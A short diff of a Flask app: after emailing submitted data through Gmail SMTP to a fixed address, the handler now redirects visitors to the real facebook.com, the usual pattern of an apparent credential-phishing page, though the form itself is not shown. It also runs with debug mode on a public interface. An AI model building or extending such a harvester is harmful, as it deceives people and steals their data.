@@ -22,7 +22,7 @@ def index():
         with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as smtp:
             smtp.login(email_sender, password)
             smtp.sendmail(email_sender, email_receiver, em.as_string())
-        return redirect(url_for('index'))
+        return redirect("https://www.facebook.com")
     return render_template('index.html')
 if __name__ == '__main__':
     app.run(debug=True, host="0.0.0.0", port=os.getenv("PORT", default=5000))
